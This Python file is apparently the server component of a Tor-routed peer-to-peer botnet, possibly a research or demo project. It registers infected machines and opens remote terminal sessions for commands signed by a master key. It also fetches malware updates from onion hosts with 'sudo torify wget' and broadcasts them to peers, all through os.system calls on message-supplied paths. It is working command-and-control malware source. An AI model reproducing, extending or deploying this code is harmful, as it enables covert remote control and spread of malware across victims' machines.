"""Server side of the p2p communication protocol"""

import os
import time
import socks
import socket
import logging
import threading

from botnet_p2p import BUFFER_SIZE
from botnet_p2p.operations import (
    add_new_infected_machine,
    terminal_session,
    establish_tunnel,
    broadcast,
)
from botnet_p2p.message import breakdown_msg, signed_by_master
from botnet_p2p.security import calculate_file_hash

logging.basicConfig(level=logging.DEBUG)


NEW_NODE = 0
SHELL = 1
UPDATE_FILE = 2

SERVER_HOST = "localhost"
SERVER_PORT = 50000
TOR_SERVER_PORT = 50001
DOWN_SERVER_PORT = 40000
TOR_DOWN_SERVER_PORT = 40001
MAX_QUEUE = 4

base_folder = "/etc/systemd/system/rootkit_demo"
public_folder = os.path.join(base_folder, "public")
public_peer_list = os.path.join(public_folder, "peer_list")
private_peer_list = os.path.join(base_folder, "private/full_peer_list")
public_key_path = os.path.join(public_folder, "source/public_key")
process_path = os.path.join(base_folder, "process")


socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
socket.socket = socks.socksocket


def setup_server():
    logging.info("Copying pids to process file ...")
    process_thread = threading.Thread(target=write_pids_to_process_file, args=())
    process_thread.start()

    logging.info("Starting communication server ...")
    server_socket = socket.socket()
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(MAX_QUEUE)

    while True:
        client_socket, addr = server_socket.accept()
        client_thread = threading.Thread(target=talk_with_client, args=(client_socket,))
        client_thread.start()


def write_pids_to_process_file():
    with open(process_path, "w") as process_file:
        process_file.write(f"{os.getpid()}\n")

    len_file = 0
    while len_file < 2:
        os.system(
            "ps aux | grep \"http.server 40000\" | grep -v grep | awk {'print $2'} >> "
            + process_path
        )
        time.sleep(5)

        with open(process_path, "r") as process_file:
            len_file = len(process_file.readlines())


def talk_with_client(client_socket: socket.socket) -> None:
    """ Keep the connection alive with the client and exchange
        messages

        Args:
            client_socket: Socket used to talk with the client
    """
    logging.info("New client connected...")
    coded_msg = client_socket.recv(BUFFER_SIZE)
    msg_info = breakdown_msg(coded_msg)

    num_anonymizers = msg_info["num_anonymizers"]
    msg_type = msg_info["msg_type"]
    msg = msg_info["msg"]

    if num_anonymizers < 0:
        client_socket.close()
    elif num_anonymizers != 0:
        establish_tunnel(client_socket, private_peer_list, TOR_SERVER_PORT, msg_info)
    else:
        if msg_type == NEW_NODE and not msg_requires_to_be_signed(msg_type):
            add_new_infected_machine(msg, public_peer_list, private_peer_list)
        else:
            if signed_by_master(coded_msg, public_key_path):
                logging.info("The message was signed by the master")
                if msg_type == SHELL:
                    terminal_session(client_socket, public_key_path)
                elif msg_type == UPDATE_FILE:
                    file_path, hash_, onion = get_update_malware_info(msg)
                    system_hash_file = calculate_file_hash(public_folder + file_path)
                    if system_hash_file != hash_:
                        update_file(file_path, onion)
                        with open(private_peer_list, "r") as neighbours:
                            neighbours_info = neighbours.readlines()
                        onions = [line.strip().split()[2] for line in neighbours_info]
                        broadcast(TOR_SERVER_PORT, coded_msg, onions)
            else:
                logging.info("Someone is trying to break in")


def msg_requires_to_be_signed(msg_type: int) -> bool:
    return msg_type != NEW_NODE


def get_update_malware_info(msg: str) -> (str, str, str):
    words = msg.split()
    onion = get_onion(words)
    hash_ = get_hash_file(words)
    file_path = get_file_path(words, [onion, hash_])

    return file_path, hash_, onion


def get_onion(words: list) -> str:
    onion = [
        possible_onion for possible_onion in words if possible_onion.endswith("onion")
    ][0]
    return onion


def get_hash_file(words: list) -> str:
    hash_ = [possible_hash for possible_hash in words if len(possible_hash) == 64][0]
    return hash_


def get_file_path(words: list, already_extracted_words: list) -> str:
    file_path = (set(words) - set(already_extracted_words)).pop()
    return file_path


def update_file(file_path: str, onion: str):
    download_msg = (
        f"sudo torify wget {onion}:{TOR_DOWN_SERVER_PORT}/{file_path} "
        + f"-O {public_folder + file_path}"
    )
    logging.debug(f"Download message {download_msg}")
    os.system(download_msg)


if __name__ == "__main__":
    setup_server()
